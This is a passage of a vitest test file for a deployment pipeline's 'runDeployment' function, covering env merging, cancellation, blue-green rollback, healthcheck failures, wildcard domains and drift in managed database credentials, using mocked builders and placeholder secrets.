import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { auditLog, deployments, domains, services } from '@ninedeploy/db';
import { logBus } from '../src/engine/logs.js';
import { filterTrustworthyProjectLinks, runDeployment } from '../src/engine/pipeline.js';

const h = vi.hoisted(() => {
  const buildAndRun = vi.fn(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
  const isHealthy = vi.fn(async () => true);
  const stop = vi.fn(async () => undefined);
  const builder = { buildAndRun, isHealthy, stop };
  const checkoutCommit = vi.fn(async () => 'sha-1234567');
  const decrypt = vi.fn((v: string) => `dec:${v}`);
  const connectionString = vi.fn(() => 'postgres://db/app');
  const ENGINES = {
    postgres: { port: 5432, username: () => 'nine', dbName: () => 'app' },
    mysql: { port: 3306, username: () => 'root', dbName: () => 'app' },
  };
  const writeDynamicConfig = vi.fn(async () => undefined);
  const getAcmeEmail = vi.fn(async () => null as string | null);
  const config: { paths: { reposDir: string; logsDir: string; dataDir: string }; wildcardDomain: string } = {
    paths: { reposDir: '', logsDir: '', dataDir: '' },
    wildcardDomain: '',
  };
  const agentOp = vi.fn(async () => ({ exitCode: 0, lines: [] }));
  const reconcileTemplateDependencies = vi.fn(async () => null as null | { database: { slug: string }; alreadyAttached: boolean });
  return { builder, checkoutCommit, decrypt, connectionString, ENGINES, writeDynamicConfig, getAcmeEmail, config, agentOp, reconcileTemplateDependencies };
});

vi.mock('../src/config.js', () => ({ config: h.config }));
// The finalize grace period sleeps 2s in real life — stub it for tests.
const execMock = vi.hoisted(() => ({
  sleep: vi.fn(async () => undefined),
  run: vi.fn(async () => ({ stdout: '', stderr: '' })),
}));
const sleepMock = execMock;
vi.mock('../src/lib/exec.js', () => execMock);
vi.mock('../src/lib/crypto.js', () => ({ decrypt: h.decrypt }));
vi.mock('../src/lib/git.js', () => ({ checkoutCommit: h.checkoutCommit }));
vi.mock('../src/lib/agentClient.js', () => ({ agentOp: h.agentOp }));
vi.mock('../src/engine/database.js', () => ({ connectionString: h.connectionString, ENGINES: h.ENGINES }));
vi.mock('../src/engine/builders/docker.js', () => ({ dockerBuilder: h.builder }));
vi.mock('../src/engine/builders/pm2.js', () => ({ pm2Builder: h.builder }));
vi.mock('../src/engine/builders/compose.js', () => ({ composeBuilder: h.builder }));
vi.mock('../src/engine/proxy.js', () => ({
  writeDynamicConfig: h.writeDynamicConfig,
  getAcmeEmail: h.getAcmeEmail,
}));
vi.mock('../src/engine/templateDependencies.js', () => ({
  reconcileTemplateDependencies: h.reconcileTemplateDependencies,
}));

const base = mkdtempSync(path.join(os.tmpdir(), 'nd-pipeline-'));
const reposDir = path.join(base, 'repos');
const logsDir = path.join(base, 'logs');
mkdirSync(logsDir, { recursive: true });
h.config.paths = { reposDir, logsDir, dataDir: base };

afterAll(() => {
  rmSync(base, { recursive: true, force: true });
});

const dep = {
  id: 1,
  serviceId: 5,
  status: 'queued',
  commitSha: null,
  message: null,
  author: null,
  trigger: 'manual',
  logPath: null,
  startedAt: null,
  finishedAt: null,
  createdAt: new Date(0),
};

const service = {
  id: 5,
  projectId: null,
  ownerUserId: 7,
  name: 'Web',
  slug: 'web',
  type: 'docker',
  status: 'idle',
  repoUrl: 'https://github.com/a/b.git',
  branch: 'main',
  commitSha: null,
  sourceId: null,
  image: null,
  volumeMount: null,
  port: 3000,
  healthPath: '/',
  runtimeId: null,
  cpuShares: 0,
  memLimitMb: 0,
  createdAt: new Date(0),
  updatedAt: new Date(0),
};

interface FakeDb {
  query: {
    deployments: { findFirst: ReturnType<typeof vi.fn> };
    services: { findFirst: ReturnType<typeof vi.fn> };
    buildConfigs: { findFirst: ReturnType<typeof vi.fn> };
    sources: { findFirst: ReturnType<typeof vi.fn> };
    envVars: { findMany: ReturnType<typeof vi.fn> };
    databaseAttachments: { findMany: ReturnType<typeof vi.fn> };
    databases: { findFirst: ReturnType<typeof vi.fn> };
    domains: { findFirst: ReturnType<typeof vi.fn> };
    // The runtime-env sink re-verifies every project link against the
    // owner's workspace seats before decrypting shared env (cross-tenant
    // defence in depth).
    projects: { findFirst: ReturnType<typeof vi.fn> };
    workspaceMembers: { findFirst: ReturnType<typeof vi.fn> };
    users: { findFirst: ReturnType<typeof vi.fn> };
  };
  select: ReturnType<typeof vi.fn>;
  update: ReturnType<typeof vi.fn>;
  insert: ReturnType<typeof vi.fn>;
}

function makeDb(): { db: FakeDb; updates: { table: unknown; values: Record<string, unknown> }[]; inserts: { table: unknown; values: Record<string, unknown> }[] } {
  const updates: { table: unknown; values: Record<string, unknown> }[] = [];
  const inserts: { table: unknown; values: Record<string, unknown> }[] = [];
  const db: FakeDb = {
    query: {
      deployments: { findFirst: vi.fn() },
      services: { findFirst: vi.fn() },
      buildConfigs: { findFirst: vi.fn() },
      sources: { findFirst: vi.fn() },
      envVars: { findMany: vi.fn().mockResolvedValue([]) },
      databaseAttachments: { findMany: vi.fn().mockResolvedValue([]) },
      databases: { findFirst: vi.fn().mockResolvedValue(undefined) },
      domains: { findFirst: vi.fn() },
      // Services carry N-N project links via `service_projects`; the pipeline
      // unions every linked project's shared env before the service's own.
      serviceProjects: { findMany: vi.fn().mockResolvedValue([]) },
      // Defaults describe an honest link: project #4 lives in workspace #1 and
      // the service's owner (#7) holds a seat there; the owner is not an
      // instance operator.
      projects: { findFirst: vi.fn().mockResolvedValue({ id: 4, workspaceId: 1 }) },
      workspaceMembers: { findFirst: vi.fn().mockResolvedValue({ id: 1, workspaceId: 1, userId: 7, role: 'member' }) },
      users: { findFirst: vi.fn().mockResolvedValue({ id: 7, isInstanceOperator: false }) },
    },
    select: vi.fn(() => ({
      from: vi.fn(() => ({
        where: vi.fn(() => Promise.resolve([])),
        leftJoin: vi.fn(() => Promise.resolve([])),
        innerJoin: vi.fn(() => Promise.resolve([])),
        orderBy: vi.fn(() => Promise.resolve([])),
        // biome-ignore lint/suspicious/noThenProperty: intentional thenable — the fake DB query result must be awaitable by the code under test.
        then: (ok: (v: unknown) => unknown) => ok([]),
      })),
    })),
    update: vi.fn((table: unknown) => ({
      set: (values: Record<string, unknown>) => {
        updates.push({ table, values });
        return {
          where: vi.fn(() => ({
            // Success-path finalize guard: pretend the row was still `building`.
            returning: vi.fn().mockResolvedValue([{ id: 1 }]),
          })),
        };
      },
    })),
    insert: vi.fn((table: unknown) => ({
      values: (values: Record<string, unknown>) => {
        inserts.push({ table, values });
        return Promise.resolve();
      },
    })),
  };
  return { db, updates, inserts };
}

function collectLogs(id: number): string[] {
  const lines: string[] = [];
  logBus.subscribe(id, (line) => lines.push(line));
  return lines;
}

function baseSetup(db: FakeDb, over: Record<string, unknown> = {}) {
  db.query.deployments.findFirst.mockResolvedValue(dep);
  db.query.services.findFirst.mockResolvedValue({ ...service, ...over });
  db.query.buildConfigs.findFirst.mockResolvedValue(null);
  db.query.envVars.findMany.mockResolvedValue([]);
  db.query.databaseAttachments.findMany.mockResolvedValue([]);
}

describe('runDeployment env merging', () => {
  it('merges project-scope shared env under service env', async () => {
    const { db } = makeDb();
    baseSetup(db, { projectId: 4, image: 'nginx:latest' });
    // Project scope is resolved through the `service_projects` link table, not
    // the legacy `services.projectId` column.
    db.query.serviceProjects.findMany.mockResolvedValue([{ serviceId: 1, projectId: 4 }]);
    // Call order: config snapshot (service scope), project scope, service scope.
    let n = 0;
    db.query.envVars.findMany.mockImplementation(async () => {
      n++;
      if (n === 2) return [{ key: 'SHARED', valueEncrypted: 'enc:s', isSecret: true, scope: 'project' }];
      return [{ key: 'OWN', valueEncrypted: 'enc:o', isSecret: true, scope: 'service' }];
    });
    await runDeployment(db as never, 1);
    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { env: Record<string, string> };
    expect(ctx.env).toEqual({ SHARED: 'dec:enc:s', OWN: 'dec:enc:o' });
  });

  it('skips the project lookup for project-less services', async () => {
    const { db } = makeDb();
    baseSetup(db, { projectId: null, image: 'nginx:latest' });
    await runDeployment(db as never, 1);
    // Snapshot + service lookup only — no project-scope query.
    expect(db.query.envVars.findMany).toHaveBeenCalledTimes(2);
  });

  it('snapshots the effective config onto the deployment row', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    await runDeployment(db as never, 1);
    const building = updates.find((u) => u.values.status === 'building');
    expect(building).toBeDefined();
    const snapshot = JSON.parse(building!.values.configSnapshot as string) as Record<string, unknown>;
    expect(snapshot.image).toBe('nginx:latest');
    expect(snapshot.restartPolicy).toBe('unless-stopped');
    expect(snapshot.envKeys).toEqual([]);
  });
});

describe('runDeployment', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.config.wildcardDomain = '';
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async () => true);
    h.builder.stop.mockImplementation(async () => undefined);
    h.checkoutCommit.mockImplementation(async () => 'sha-1234567');
    h.writeDynamicConfig.mockImplementation(async () => undefined);
    h.getAcmeEmail.mockImplementation(async () => null);
    h.connectionString.mockImplementation(() => 'postgres://db/app');
  });

  afterEach(() => {
    logBus.removeAllListeners();
  });

  it('treats a deployment row deleted mid-flight as cancelled (stops the zombie pipeline)', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest', port: null, runtimeId: null });
    // The entry lookup sees the row; every later read (the cancel checkpoints)
    // sees NOTHING — the operator cancelled the deploy and removed the already
    // terminal row while this pipeline was still running.
    let reads = 0;
    db.query.deployments.findFirst.mockImplementation(async () => (reads++ === 0 ? dep : undefined));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    // The zombie must stop at the FIRST checkpoint, before any build starts —
    // otherwise it holds its concurrency slot and the queued deploys behind it
    // never proceed.
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(lines).toContain('⏹ Deployment cancelled');
    expect(updates.map((u) => [u.table, u.values.status])).toEqual([
      [deployments, 'building'],
      [services, 'deploying'],
      [services, 'idle'],
      [deployments, 'cancelled'],
    ]);
  });

  it('returns early when the deployment row is missing', async () => {
    const { db, updates } = makeDb();
    db.query.deployments.findFirst.mockResolvedValue(undefined);

    await runDeployment(db as never, 1);

    expect(db.query.services.findFirst).not.toHaveBeenCalled();
    expect(updates).toHaveLength(0);
    expect(h.checkoutCommit).not.toHaveBeenCalled();
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
  });

  it('returns early when the service row is missing', async () => {
    const { db, updates } = makeDb();
    db.query.deployments.findFirst.mockResolvedValue(dep);
    db.query.services.findFirst.mockResolvedValue(undefined);

    await runDeployment(db as never, 1);

    expect(updates).toHaveLength(0);
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
  });

  it('fails the deployment for an unknown service type', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { type: 'k8s' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('▶ Deployment #1 for "Web" (k8s)');
    expect(lines).toContain('✗ Unknown service type: k8s');
    expect(updates.map((u) => [u.table, u.values.status])).toEqual([
      [deployments, 'building'],
      [services, 'deploying'],
      [deployments, 'failed'],
      [services, 'error'],
    ]);
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
  });

  it('deploys an image-based service without touching git', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest', port: null });
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: null, healthPath: '/' }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).not.toHaveBeenCalled();
    expect(h.builder.buildAndRun).toHaveBeenCalledTimes(1);
    const [ctx, previous] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>, unknown];
    expect(ctx.commitSha).toBe('');
    expect(ctx.workDir).toBe(path.join(reposDir, '5'));
    expect(previous).toBeUndefined();
    expect(lines).toContain('Image deploy from nginx:latest');
    expect(lines).toContain('Running healthcheck …');
    expect(lines).toContain('✓ Deployment successful');

    const svcUpdate = updates.find((u) => u.table === services && u.values.status === 'running');
    expect(svcUpdate?.values).toMatchObject({ runtimeId: 'c-1', port: null, commitSha: '' });
    const depUpdate = updates.find((u) => u.table === deployments && u.values.status === 'running');
    expect(depUpdate?.values.finishedAt).toBeInstanceOf(Date);
    expect(h.writeDynamicConfig).toHaveBeenCalledWith(db);
    expect(db.query.domains.findFirst).not.toHaveBeenCalled();
  });

  it('demotes older running rows to superseded when the build goes live', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });

    await runDeployment(db as never, 1);

    // The finalize itself flips THIS row to running; a sibling update demotes
    // every OTHER running row of the service so history no longer shows past
    // deploys as still-Running.
    expect(updates.some((u) => u.table === deployments && u.values.status === 'running')).toBe(true);
    const demote = updates.find((u) => u.table === deployments && u.values.status === 'superseded');
    expect(demote).toBeDefined();
  });

  it('stores a managed-env fingerprint and warns loudly when it drifts', async () => {
    const wpMapping = {
      WORDPRESS_DB_HOST: 'host',
      WORDPRESS_DB_USER: 'username',
      WORDPRESS_DB_PASSWORD: 'password',
      WORDPRESS_DB_NAME: 'database',
    };
    const dbRow = {
      id: 2,
      engine: 'mysql',
      status: 'running',
      containerName: 'nd-db-web-db',
      internalHost: 'nd-db-web-db',
      internalPort: 3306,
      username: 'nine',
      dbName: 'app',
      passwordEncrypted: 'enc:secret-one',
    };

    // ── First deploy: capture the fingerprint persisted onto its row. ──
    const first = makeDb();
    baseSetup(first.db, { image: 'nginx:latest' });
    first.db.query.services.findFirst.mockResolvedValue({
      ...service,
      image: 'nginx:latest',
      templateId: 'wordpress',
      templateDatabaseEnv: wpMapping,
    });
    first.db.query.databaseAttachments.findMany.mockResolvedValue([{ serviceId: 5, databaseId: 2, envAlias: 'DATABASE_URL' }]);
    first.db.query.databases.findFirst.mockResolvedValue(dbRow);
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-1', port: 3000, healthPath: '/' });

    await runDeployment(first.db as never, 1);

    const snap1Update = first.updates.find((u) => u.table === deployments && u.values.status === 'running');
    const snap1 = JSON.parse(snap1Update!.values.configSnapshot as string) as { managedEnv: Record<string, string> };
    expect(Object.keys(snap1.managedEnv).sort()).toEqual([
      'WORDPRESS_DB_HOST', 'WORDPRESS_DB_NAME', 'WORDPRESS_DB_PASSWORD', 'WORDPRESS_DB_USER',
    ]);

    // ── Second deploy with the SAME volume-backed app but the managed DB's
    // stored password changed underneath it: the old wp-config.php baked on
    // first boot can no longer authenticate, and the operator needs to know
    // WHY a green deploy broke their site. ──
    const second = makeDb();
    baseSetup(second.db, {
      image: 'nginx:latest',
      templateId: 'wordpress',
      templateDatabaseEnv: wpMapping,
    });
    second.db.query.deployments.findFirst.mockResolvedValue({ ...dep, configSnapshot: JSON.stringify(snap1) });
    second.db.query.databaseAttachments.findMany.mockResolvedValue([{ serviceId: 5, databaseId: 2, envAlias: 'DATABASE_URL' }]);
    second.db.query.databases.findFirst.mockResolvedValue({ ...dbRow, passwordEncrypted: 'enc:secret-two' });
    second.db.query.serviceProjects.findMany.mockResolvedValue([]);
    const lines2 = collectLogs(1);

    await runDeployment(second.db as never, 1);

    expect(lines2.some((l) => l.includes('Managed database value "WORDPRESS_DB_PASSWORD" differs'))).toBe(true);
    expect(lines2.some((l) => l.includes('wp-config.php'))).toBe(true);
    // And the fresh fingerprint is persisted so chains of redeploys keep comparing.
    const snap2Update = second.updates.find((u) => u.table === deployments && u.values.status === 'running');
    const snap2 = JSON.parse(snap2Update!.values.configSnapshot as string) as { managedEnv: Record<string, string> };
    expect(snap2.managedEnv.WORDPRESS_DB_PASSWORD).not.toBe(snap1.managedEnv.WORDPRESS_DB_PASSWORD);
  });

  it('keeps the full config snapshot when persisting the managed-env fingerprint', async () => {
    // The finalize update used to REPLACE the claim-time snapshot with
    // `{managedEnv}` alone — the /diff endpoint then lost the build-config
    // diff for every template- or database-attached service.
    const wpMapping = {
      WORDPRESS_DB_HOST: 'host',
      WORDPRESS_DB_USER: 'username',
      WORDPRESS_DB_PASSWORD: 'password',
      WORDPRESS_DB_NAME: 'database',
    };
    const fake = makeDb();
    baseSetup(fake.db, {
      image: 'nginx:latest',
      templateId: 'wordpress',
      templateDatabaseEnv: wpMapping,
    });
    fake.db.query.databaseAttachments.findMany.mockResolvedValue([{ serviceId: 5, databaseId: 2, envAlias: 'DATABASE_URL' }]);
    fake.db.query.databases.findFirst.mockResolvedValue({
      id: 2,
      engine: 'mysql',
      status: 'running',
      containerName: 'nd-db-web-db',
      internalHost: 'nd-db-web-db',
      internalPort: 3306,
      username: 'nine',
      dbName: 'app',
      passwordEncrypted: 'enc:secret-one',
    });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-1', port: 3000, healthPath: '/' });

    await runDeployment(fake.db as never, 1);

    const snapUpdate = fake.updates.find((u) => u.table === deployments && u.values.status === 'running');
    const snap = JSON.parse(snapUpdate!.values.configSnapshot as string) as Record<string, unknown>;
    expect(snap.managedEnv).toBeDefined();
    // The claim-time snapshot fields must survive the merge.
    expect(snap.buildPack).toBe('auto');
    expect(Array.isArray(snap.envKeys)).toBe(true);
    expect(snap.image).toBe('nginx:latest');
  });

  it('persists a runtime port repaired during the healthcheck', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'n8nio/n8n', port: 80 });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'n8n-1', port: 80, healthPath: '/' });
    h.builder.isHealthy.mockImplementation(async (runtime: { port: number | null }) => {
      runtime.port = 5678;
      return true;
    });

    await runDeployment(db as never, 1);

    const svcUpdate = updates.find((u) => u.table === services && u.values.status === 'running');
    expect(svcUpdate?.values).toMatchObject({ runtimeId: 'n8n-1', port: 5678 });
  });

  it('resolves creds from the source row and persists the checked-out sha', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { sourceId: 7 });
    db.query.deployments.findFirst.mockResolvedValue({ ...dep, commitSha: 'pin-sha' });
    db.query.sources.findFirst.mockResolvedValue({
      id: 7,
      type: 'github',
      tokenEncrypted: 'tok',
      deployKeyEncrypted: 'key',
    });
    h.checkoutCommit.mockResolvedValue('resolved-sha');

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).toHaveBeenCalledWith(
      'https://github.com/a/b.git',
      'main',
      'pin-sha',
      path.join(reposDir, '5'),
      expect.any(Function),
      { type: 'github', token: 'dec:tok', deployKey: 'dec:key' },
    );
    const shaUpdate = updates.find((u) => u.table === deployments && u.values.commitSha === 'resolved-sha');
    expect(shaUpdate).toBeDefined();
  });

  it('builds creds with undefined token/deployKey when the source has none and defaults the repoUrl', async () => {
    const { db } = makeDb();
    baseSetup(db, { sourceId: 7, repoUrl: null });
    db.query.sources.findFirst.mockResolvedValue({
      id: 7,
      type: 'custom',
      tokenEncrypted: null,
      deployKeyEncrypted: null,
    });

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).toHaveBeenCalledWith(
      '',
      'main',
      undefined,
      path.join(reposDir, '5'),
      expect.any(Function),
      { type: 'custom', token: undefined, deployKey: undefined },
    );
  });

  it('calls checkoutCommit without creds when the source row is missing', async () => {
    const { db } = makeDb();
    baseSetup(db, { sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue(undefined);

    await runDeployment(db as never, 1);

    expect(db.query.sources.findFirst).toHaveBeenCalled();
    expect(h.checkoutCommit).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(String),
      undefined,
      expect.any(String),
      expect.any(Function),
      undefined,
    );
  });

  it('calls checkoutCommit without querying sources when sourceId is absent', async () => {
    const { db } = makeDb();
    baseSetup(db);

    await runDeployment(db as never, 1);

    expect(db.query.sources.findFirst).not.toHaveBeenCalled();
    expect(h.checkoutCommit).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(String),
      undefined,
      expect.any(String),
      expect.any(Function),
      undefined,
    );
  });

  it('passes the previous runtime when the service was already running', async () => {
    const { db } = makeDb();
    baseSetup(db, { runtimeId: 'old-c', port: 8080, healthPath: '/health' });

    await runDeployment(db as never, 1);

    const [, previous] = h.builder.buildAndRun.mock.calls[0] as [unknown, unknown];
    expect(previous).toEqual({ runtimeId: 'old-c', port: 8080, healthPath: '/health' });
  });

  it('normalises a null port and healthPath in the previous runtime', async () => {
    const { db } = makeDb();
    baseSetup(db, { runtimeId: 'old-c', port: null, healthPath: null });

    await runDeployment(db as never, 1);

    const [, previous] = h.builder.buildAndRun.mock.calls[0] as [unknown, unknown];
    expect(previous).toEqual({ runtimeId: 'old-c', port: null, healthPath: '/' });
  });

  it('stops the previous runtime after a successful blue-green deploy (finalize)', async () => {
    const { db } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✓ Deployment successful');
    // Routing flipped to the new container first, a grace period let Traefik
    // reload, and only then was the old container stopped.
    expect(h.writeDynamicConfig).toHaveBeenCalledWith(db);
    expect(sleepMock.sleep).toHaveBeenCalledWith(2000);
    expect(h.builder.stop).toHaveBeenCalledWith('old-c', { graceSeconds: undefined });
  });

  it('rolls back to the previous runtime when the new one fails healthcheck (blue-green)', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c', port: 8080, healthPath: '/health' });
    // New runtime unhealthy, but the previous is still alive.
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 8080, healthPath: '/health' });
    h.builder.isHealthy.mockResolvedValueOnce(false).mockResolvedValueOnce(true);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('↩ Previous runtime is still healthy — rolled back to it.');
    expect(h.builder.stop).toHaveBeenCalledWith('c-2'); // failed new runtime cleaned up
    expect(updates.some((u) => u.table === services && u.values.status === 'running')).toBe(true);
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
    expect(updates.some((u) => u.table === services && u.values.status === 'error')).toBe(false);
  });

  it('marks the service errored when the previous runtime is gone (PM2-style failure)', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    // New unhealthy AND the previous is no longer alive.
    h.builder.isHealthy.mockResolvedValueOnce(false).mockResolvedValueOnce(false);

    await runDeployment(db as never, 1);

    expect(h.builder.stop).toHaveBeenCalledWith('c-2');
    expect(updates.some((u) => u.table === services && u.values.status === 'error')).toBe(true);
    expect(updates.some((u) => u.table === services && u.values.status === 'running')).toBe(false);
  });

  it('treats a previous-runtime probe error as not restorable', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    h.builder.isHealthy.mockResolvedValueOnce(false).mockRejectedValueOnce(new Error('probe boom'));

    await runDeployment(db as never, 1);

    expect(updates.some((u) => u.table === services && u.values.status === 'error')).toBe(true);
  });

  it('does not throw when safeFail cannot persist the failure status', async () => {
    const { db } = makeDb();
    baseSetup(db);
    h.builder.buildAndRun.mockRejectedValue(new Error('build boom'));
    // Make only the failure-status writes inside safeFail reject.
    db.update = vi.fn(() => ({
      set: (values: Record<string, unknown>) => ({
        where:
          values.status === 'failed' || values.status === 'error'
            ? vi.fn().mockRejectedValue(new Error('db locked'))
            : vi.fn().mockResolvedValue(undefined),
      }),
    }));
    const lines = collectLogs(1);

    await expect(runDeployment(db as never, 1)).resolves.toBeUndefined();
    expect(lines).toContain('failed to mark deployment failed: db locked');
    expect(lines).toContain('failed to mark service errored: db locked');
  });

  it('logs a finalize warning and still succeeds when stopping the previous runtime fails', async () => {
    const { db } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    h.builder.stop.mockRejectedValue(new Error('docker down'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('finalize warning (previous stop): docker down');
    expect(lines).toContain('✓ Deployment successful');
  });

  it('logs a wildcard-domain warning and still succeeds when the insert fails', async () => {
    const { db } = makeDb();
    h.config.wildcardDomain = 'example.com';
    baseSetup(db);
    db.query.domains.findFirst.mockResolvedValue(undefined);
    db.insert = vi.fn(() => ({ values: () => Promise.reject(new Error('unique constraint')) }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('warning: could not auto-assign wildcard domain: unique constraint');
    expect(lines).toContain('✓ Deployment successful');
  });

  it('auto-provisions a wildcard domain when configured and missing', async () => {
    const { db, inserts } = makeDb();
    h.config.wildcardDomain = 'example.com';
    baseSetup(db);
    db.query.domains.findFirst.mockResolvedValue(undefined);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    // Scoped to `domains`: the pipeline also writes the deploy OUTCOME to the
    // audit log now, so a bare insert count would conflate the two.
    const domainInserts = inserts.filter((i: { table: unknown }) => i.table === domains);
    expect(domainInserts).toHaveLength(1);
    expect(domainInserts[0].values).toEqual({
      serviceId: 5,
      hostname: 'web.example.com',
      path: '/',
      ssl: false,
      status: 'active',
    });
    expect(lines).toContain('🌐 Auto-assigned URL: http://web.example.com');
  });

  it('enables HTTPS for auto-provisioned wildcard domains when ACME is configured', async () => {
    const { db, inserts } = makeDb();
    h.config.wildcardDomain = 'example.com';
    h.getAcmeEmail.mockResolvedValueOnce('ops@example.com');
    baseSetup(db);
    db.query.domains.findFirst.mockResolvedValue(undefined);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(inserts.filter((i: { table: unknown }) => i.table === domains)[0].values).toMatchObject({ hostname: 'web.example.com', ssl: true });
    expect(lines).toContain('🌐 Auto-assigned URL: https://web.example.com');
  });

  it('does not duplicate an existing wildcard domain', async () => {
    const { db, inserts } = makeDb();
    h.config.wildcardDomain = 'example.com';
    baseSetup(db);
    db.query.domains.findFirst.mockResolvedValue({ id: 1 });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(inserts.filter((i: { table: unknown }) => i.table === domains)).toHaveLength(0);
    expect(lines.some((line) => line.includes('Auto-assigned URL:'))).toBe(false);
  });

  it('logs a proxy warning and still succeeds when the dynamic config write fails', async () => {
    const { db } = makeDb();
    baseSetup(db);
    h.writeDynamicConfig.mockRejectedValue(new Error('disk full'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('proxy warning: disk full');
    expect(lines).toContain('✓ Deployment successful');
  });

  it('logs a proxy warning with the raw value when the failure is not an Error', async () => {
    const { db } = makeDb();
    baseSetup(db);
    h.writeDynamicConfig.mockRejectedValue('disk full');
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('proxy warning: disk full');
    expect(lines).toContain('✓ Deployment successful');
  });

  it('keeps the previous container serving when the routing flip fails (no silent outage)', async () => {
    const { db } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' }); // a previous container is serving
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    h.writeDynamicConfig.mockRejectedValue(new Error('disk full'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    // Routing did not flip → the previous container must NOT be retired.
    expect(h.builder.stop).not.toHaveBeenCalledWith('old-c');
    expect(lines).toContain('↩ finalize skipped: routing did not flip, the previous container stays live');
  });

  it('fails the deployment with a stringified reason when the failure is not an Error', async () => {
    const { db } = makeDb();
    baseSetup(db);
    h.builder.buildAndRun.mockRejectedValue('build boom');
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✗ Deployment failed: build boom');
    expect(h.builder.stop).not.toHaveBeenCalled();
  });

  it('fails the deployment when the healthcheck never passes', async () => {
    const { db, updates } = makeDb();
    baseSetup(db);
    h.builder.isHealthy.mockResolvedValue(false);
    h.builder.stop.mockRejectedValue(new Error('cannot stop'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✗ Deployment failed: Healthcheck failed — service did not become ready in time');
    expect(h.builder.stop).toHaveBeenCalledWith('c-1');
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
    expect(updates.some((u) => u.table === services && u.values.status === 'error')).toBe(true);
    expect(updates.some((u) => u.values.status === 'running')).toBe(false);
  });

  it('fails the deployment when buildAndRun throws, without stopping', async () => {
    const { db, updates } = makeDb();
    baseSetup(db);
    h.builder.buildAndRun.mockRejectedValue(new Error('build boom'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✗ Deployment failed: build boom');
    expect(h.builder.stop).not.toHaveBeenCalled();
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
  });

  it('fails the deployment when the git checkout throws', async () => {
    const { db } = makeDb();
    baseSetup(db);
    h.checkoutCommit.mockRejectedValue(new Error('auth failed'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✗ Deployment failed: auth failed');
    expect(h.builder.stop).not.toHaveBeenCalled();
  });

  it('loads env vars and connection strings from attached running databases', async () => {
    const { db } = makeDb();
    baseSetup(db);
    db.query.envVars.findMany.mockResolvedValue([
      { id: 1, key: 'FOO', valueEncrypted: 'e1' },
      { id: 2, key: 'BAR', valueEncrypted: 'e2' },
    ]);
    db.query.databaseAttachments.findMany.mockResolvedValue([
